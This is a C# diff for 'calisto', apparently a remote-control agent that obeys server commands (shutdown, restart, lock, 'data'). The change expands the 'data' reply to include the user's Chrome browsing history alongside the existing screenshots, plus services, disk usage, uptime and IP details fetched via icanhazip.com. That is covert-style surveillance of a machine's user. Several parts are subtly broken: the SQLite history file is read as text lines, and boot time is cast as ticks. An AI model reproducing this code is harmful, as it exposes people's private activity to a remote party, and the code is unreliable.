@@ -12,6 +12,9 @@ using System.Threading.Tasks;
 using System.Net.Http;
 using System.Text;
 using System.Configuration;
+using System.Net;
+using System.Net.Sockets;
+using System.Management;
 
 namespace calisto
 {
@@ -115,8 +118,14 @@ namespace calisto
                 ShutDown();
                 return true;
             }
-            // if the response is data return JSON with data about host
-            else if (response.Trim().ToLower() == "data")
+			//If the respoinse is Restart to restart the host
+			else if (response.Trim().ToLower() == "restart")
+			{
+				Restart();
+				return true;
+			}
+			// if the response is data return JSON with data about host
+			else if (response.Trim().ToLower() == "data")
             {
                 // Get the current system status
                 var systemStatus = GetSystemStatus();
@@ -205,8 +214,23 @@ namespace calisto
             // Get a list of applications running on the system
             systemStatus.Applications = GetRunningApplications();
 
-            // Update the system status cache
-            systemStatusCache = systemStatus;
+			// Get a Chrome history file
+			systemStatus.ChromeHistory = GetChromeHistoryAsync().Result;
+
+			// Get System uptime
+			systemStatus.Uptime = GetSystemUptime();
+
+			// Get System disk usage
+			systemStatus.DiskUsage = GetDiskUsage();
+
+			// Get System services
+			systemStatus.Services = GetHostServices();
+
+			// Get System services
+			systemStatus.IpInfo = GetIpInfo();
+
+			// Update the system status cache
+			systemStatusCache = systemStatus;
 
             return systemStatus;
         }
@@ -294,45 +318,291 @@ namespace calisto
                 return new byte[0];
             }
         }
-        private List<string> GetRunningApplications()
-        {
-            // Get a list of all running processes
-            Process[] processes = Process.GetProcesses();
+		private List<string> GetRunningApplications()
+		{
+			// Get a list of all running processes
+			Process[] processes = Process.GetProcesses();
 
-            // Create a list to store the names of the running applications
-            var runningApplications = new List<string>();
+			// Create a list to store the names of the running applications
+			var runningApplications = new List<string>();
 
-            // Iterate through the processes
-            foreach (Process process in processes)
-            {
-                try
-                {
-                    // Get the process name
-                    string processName = process.ProcessName;
+			// Iterate through the processes
+			foreach (Process process in processes)
+			{
+				try
+				{
+					// Check if the process is running in the foreground
+					if (process.MainWindowHandle != IntPtr.Zero)
+					{
+						// Get the process name
+						string processName = process.ProcessName;
 
-                    // Check if the process name is not empty
-                    if (!string.IsNullOrEmpty(processName))
-                    {
-                        // Add the process name to the list
-                        runningApplications.Add(processName);
-                    }
-                }
-                catch (Exception ex)
-                {
-                    // An error occurred while getting the process name
-                    // Log the exception
-                    log.Error($"An error occurred while getting the process name: {ex.Message}", ex);
-                }
-            }
+						// Check if the process name is not empty
+						if (!string.IsNullOrEmpty(processName))
+						{
+							// Add the process name to the list
+							runningApplications.Add(processName);
+						}
+					}
+				}
+				catch (Exception ex)
+				{
+					// An error occurred while getting the process name
+					// Log the exception
+					log.Error($"An error occurred while getting the process name: {ex.Message}", ex);
+				}
+			}
 
-            return runningApplications;
-        }
+			return runningApplications;
+		}
 
-        private void ShutDown()
+		private async Task<List<string>> GetChromeHistoryAsync()
+		{
+			// Create a list to store the history data
+			List<string> history = new List<string>();
+
+			// Get the path to the Chrome history file
+			string historyPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\History");
+
+			// Read the history file
+			using (StreamReader reader = new StreamReader(historyPath))
+			{
+				// Skip the first line
+				await reader.ReadLineAsync();
+
+				// Read each line of the file and add it to the list
+				while (!reader.EndOfStream)
+				{
+					history.Add(reader.ReadLine());
+				}
+			}
+
+			// Return the list of history data
+			return history;
+		}
+
+		public IpInfo GetIpInfo()
+		{
+			// Create a new IpInfo instance to store the IP information
+			var ipInfo = new IpInfo();
+
+			// Try to get the LAN IP
+			try
+			{
+				ipInfo.LanIp = GetLanIp();
+			}
+			// If an exception is thrown, log the error and continue execution
+			catch (Exception ex)
+			{
+				log.Error("Error getting LAN IP: " + ex.Message);
+			}
+
+			// Try to get the public IP
+			try
+			{
+				// Use a WebClient to download the public IP from a website that displays it
+				ipInfo.PublicIp = new WebClient().DownloadString("https://icanhazip.com");
+			}
+			// If an exception is thrown, log the error and continue execution
+			catch (Exception ex)
+			{
+				log.Error("Error getting public IP: " + ex.Message);
+			}
+
+			// Try to get the DNS
+			try
+			{
+				ipInfo.Dns = Dns.GetHostEntry("").HostName;
+			}
+			// If an exception is thrown, log the error and continue execution
+			catch (Exception ex)
+			{
+				log.Error("Error getting DNS: " + ex.Message);
+			}
+
+			// Try to get the default gateway
+			try
+			{
+				// Use the System.Management namespace to get the default gateway
+				using (var managementClass = new System.Management.ManagementClass("Win32_NetworkAdapterConfiguration"))
+				using (var managementObjectCollection = managementClass.GetInstances())
+				{
+					foreach (var managementObject in managementObjectCollection)
+					{
+						if ((bool)managementObject["IPEnabled"])
+						{
+							ipInfo.DefaultGateway = (string)managementObject["DefaultIPGateway"];
+							break;
+						}
+					}
+				}
+			}
+			// If an exception is thrown, log the error and continue execution
+			catch (Exception ex)
+			{
+				log.Error("Error getting default gateway: " + ex.Message);
+			}
+
+			try
+			{
+				// Use a ManagementObjectSearcher to get the data usage information
+				var managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PerfRawData_Tcpip_NetworkInterface");
+				foreach (var managementObject in managementObjectSearcher.Get())
+				{
+					ipInfo.DataTransmitted = (long)managementObject["BytesTotalPersec"];
+					ipInfo.DataReceived = (long)managementObject["BytesReceivedPersec"];
+				}
+			}
+			// If an exception is thrown, log the error and continue execution
+			catch (Exception ex)
+			{
+				log.Error("Error getting data usage: " + ex.Message);
+			}
+			return ipInfo;
+		}
+		public string GetLanIp()
+		{
+			// Try to get the LAN IP
+			try
+			{
+				// Use the System.Net namespace to get the host name and address list
+				var host = Dns.GetHostEntry(Dns.GetHostName());
+				foreach (var ip in host.AddressList)
+				{
+					// Check if the address is an IPv4 address
+					if (ip.AddressFamily == AddressFamily.InterNetwork)
+					{
+						// Return the IP address if it is an IPv4 address
+						return ip.ToString();
+					}
+				}
+				// Throw an exception if no LAN IP was found
+				throw new Exception("No LAN IP found");
+			}
+			// If an exception is thrown, log the error and rethrow it
+			catch (Exception ex)
+			{
+				log.Error("Error getting LAN IP: " + ex.Message);
+				throw;
+			}
+		}
+		public TimeSpan GetSystemUptime()
+		{
+			try
+			{
+				// Use the System.Management namespace to get the system uptime
+				using (var managementClass = new ManagementClass("Win32_OperatingSystem"))
+				using (var managementObjectCollection = managementClass.GetInstances())
+				{
+					foreach (var managementObject in managementObjectCollection)
+					{
+						// Convert the uptime from ticks to a TimeSpan and return it
+						return TimeSpan.FromTicks((long)managementObject["LastBootUpTime"]);
+					}
+				}
+			}
+			catch (Exception ex)
+			{
+				// Log the error and return a TimeSpan of zero
+				log.Error("Error getting system uptime: " + ex.Message);
+				return TimeSpan.Zero;
+			}
+
+			// Return a default TimeSpan of zero if the foreach loop did not execute
+			return TimeSpan.Zero;
+		}
+
+		public List<Service> GetHostServices()
+		{
+			try
+			{
+				// Use the System.Management namespace to get the host services
+				using (var managementClass = new ManagementClass("Win32_Service"))
+				using (var managementObjectCollection = managementClass.GetInstances())
+				{
+					var services = new List<Service>();
+
+					// Iterate through the collection of management objects
+					foreach (var managementObject in managementObjectCollection)
+					{
+						// Create a Service instance for each management object
+						var service = new Service
+						{
+							Name = (string)managementObject["Name"],
+							DisplayName = (string)managementObject["DisplayName"],
+							Description = (string)managementObject["Description"],
+							Status = (string)managementObject["State"],
+							StartupType = (string)managementObject["StartMode"],
+							PathToExecutable = (string)managementObject["PathName"],
+							AccountName = (string)managementObject["StartName"]
+						};
+
+						// Add the Service instance to the list
+						services.Add(service);
+					}
+
+					// Log the number of services found
+					log.Info($"Found {services.Count} services");
+
+					// Return the list of Service instances
+					return services;
+				}
+			}
+			catch (Exception ex)
+			{
+				// Log the error and return an empty list
+				log.Error("Error getting host services: " + ex.Message);
+				return new List<Service>();
+			}
+		}
+
+		public List<DiskUsage> GetDiskUsage()
+		{
+			try
+			{
+				// Use the System.Management namespace to get the disk usage
+				using (var managementClass = new ManagementClass("Win32_LogicalDisk"))
+				using (var managementObjectCollection = managementClass.GetInstances())
+				{
+					var disks = new List<DiskUsage>();
+
+					// Iterate through the collection of management objects
+					foreach (var managementObject in managementObjectCollection)
+					{
+						// Create a DiskUsage instance for each management object
+						var disk = new DiskUsage
+						{
+							Name = (string)managementObject["Name"],
+							TotalSize = (long)managementObject["Size"],
+							AvailableSpace = (long)managementObject["FreeSpace"]
+						};
+
+						// Add the DiskUsage instance to the list
+						disks.Add(disk);
+					}
+
+					// Return the list of DiskUsage instances
+					return disks;
+				}
+			}
+			catch (Exception ex)
+			{
+				// Log the error and return an empty list
+				log.Error("Error getting disk usage: " + ex.Message);
+				return new List<DiskUsage>();
+			}
+		}
+
+		private void ShutDown()
         {
             // Shut down the host
             System.Diagnostics.Process.Start("shutdown.exe", "/s /t 0");
         }
+		private void Restart()
+		{
+			// Restarts down the host
+			System.Diagnostics.Process.Start("shutdown.exe", "/r /t 0");
+		}
 
 		private void LockScreen()
 		{
@@ -346,16 +616,52 @@ namespace calisto
 
 		// Inner class to represent the system status
 		public class SystemStatus
-        {
-            public double CpuLoad { get; set; }
-            public double MemoryUsage { get; set; }
-            public DateTime Time { get; set; }
-            public byte[] Screenshot { get; set; }
-            public List<string> Applications { get; set; }
-        }
+		{
+			public double CpuLoad { get; set; }
+			public double MemoryUsage { get; set; }
+			public DateTime Time { get; set; }
+			public byte[] Screenshot { get; set; }
+			public List<string> Applications { get; set; }
+			public List<string> ChromeHistory { get; set; }
+			public TimeSpan Uptime { get; set; }
+			public List<DiskUsage> DiskUsage { get; set; }
+			public List<Service> Services { get; set; }
+			public IpInfo IpInfo { get; set; }
+		}
 
-        // Inner class to represent an application
-        private class Application
+		// Inner class to represent the IP information
+		public class IpInfo
+		{
+			public string LanIp { get; set; }
+			public string PublicIp { get; set; }
+			public string Dns { get; set; }
+			public string DefaultGateway { get; set; }
+			public long DataTransmitted { get; set; }
+			public long DataReceived { get; set; }
+		}
+
+		// Inner class to represent the system Disk Usage
+		public class DiskUsage
+		{
+			public string Name { get; set; }
+			public long TotalSize { get; set; }
+			public long AvailableSpace { get; set; }
+		}
+
+		// Inner class to represent the system services
+		public class Service
+		{
+			public string Name { get; set; }
+			public string DisplayName { get; set; }
+			public string Description { get; set; }
+			public string Status { get; set; }
+			public string StartupType { get; set; }
+			public string PathToExecutable { get; set; }
+			public string AccountName { get; set; }
+		}
+
+		// Inner class to represent an application
+		private class Application
         {
             public string Name { get; set; }
             public int Id { get; set; }
